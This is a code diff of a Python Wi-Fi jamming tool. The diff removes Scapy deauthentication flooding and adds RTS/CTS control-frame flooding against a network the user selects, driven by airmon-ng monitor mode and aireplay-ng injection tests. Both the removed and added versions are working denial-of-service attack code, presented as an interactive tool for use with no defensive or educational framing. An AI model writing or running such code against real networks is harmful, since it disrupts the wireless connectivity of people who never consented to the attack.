@@ -31,16 +31,23 @@ def network_scan():
     print ("#" * 70)
     return bssid
 
-def jam(address, card, client):
-	conf.verb = 0  # shut up Scapy
-	packet = RadioTap()/Dot11(addr1=client,addr2=address,addr3=address)/Dot11Deauth()
-	print("Jamming network: " + address)
-	sendp(packet, iface = card, count=10000000000, inter=0.001, loop=1) #Send deauth packet
-	subprocess.call('airmon-ng stop {}'.format(card), shell=True)
-	print('\nEnd of jammer.')
-	sys.exit()
+def jam(address, card, card_mac, sub):
+    #conf.verb = 0  # shut up Scapy
+    if sub == 'rts':
+        packet = RadioTap()/Dot11(type=1,subtype=11,addr1=address,addr2=card_mac,addr3=address, ID=0xFF7F)
+    else:
+        packet= RadioTap()/Dot11(type=1,subtype=12,addr1=address, addr2=card_mac, ID=0xFF7F)
+    packet.show()
+    print("Jamming network: " + address + " through: " + card + " interface: " + card_mac)
+    sendp(packet, iface = card, count=1000000, inter=0.001)
+    subprocess.call('airmon-ng stop {}'.format(card), shell=True)
+    #Stop monitor mode
+    print('\nEnd of jammer. Probably you will have to reboot your computer if your network card does not work correctly')
 
 if __name__ == "__main__":
+
+	FNULL = open(os.devnull, 'w')
+
 	bssid = network_scan()
 
 	red = input("Tell me the network number you want to jam: ")
@@ -48,27 +55,38 @@ if __name__ == "__main__":
     #Call airmon-ng to show the user a list of available network cards on their device
 	subprocess.call('airmon-ng', shell=True)
 
-    #start up monitor mode on a network card
+    #Select a network card
 	networkCard = input('Please enter the name of the network card you wish to use: ')
 
 	#Kill all processes that can interrupt
 	subprocess.call('airmon-ng check kill', stdout=FNULL, stderr=subprocess.STDOUT, shell=True)
 
     #Start monitor mode on the selected device and run 'airmon-ng check kill' to kill of any process that may be interfering with the network card
-	subprocess.call('airmon-ng start {}'.format(networkCard), shell=True)
+	subprocess.call('airmon-ng start {}'.format(networkCard), stdout=FNULL, stderr=subprocess.STDOUT, shell=True)
 
     #Call airmon-ng to show the user a list of available network cards on their device
 	subprocess.call('airmon-ng', shell=True)
 
+    #Select a monitor mode network card
 	card = input('Please enter the name of the monitor mode network card you wish to use: ')
 
-	bssid_selected = bssid[int(red)]
+	card_mac = subprocess.Popen('ifdata -ph {}'.format(card), stdout=PIPE, shell=True).stdout
+	card_mac = card_mac.read()
+	card_mac = card_mac.decode()
 
+    #injection test before inject RTS/CTS paquets in the network
 	try:
-		subprocess.call('airodump-ng --bssid {} {}'.format(bssid_selected,card), shell=True) #Call airodump-ng to show stations conected
+		while True:
+			print("Do ctrl + c when it start to inject.")
+			subprocess.call('aireplay-ng --test {}'.format(card), shell=True)
 	except KeyboardInterrupt:
-		print('\n')
+		sub = ''
 
-	client = input('Please enter the station you want to jam(write FF:FF:FF:FF:FF:FF if you want to jam all stations): ')
+		while sub != 'rts' and sub != 'cts':
+		    sub = input('What type of flooding attack do you want to do: rts or cts: ')
+		    if sub != 'rts' and sub != 'cts':
+		        print("Sorry, that's not an option. Choose between rts or cts.")
 
-	jam(bssid[int(red)], card, client)
+		bssid_selected = bssid[int(red)]
+
+		jam(bssid[int(red)], card, card_mac , sub)
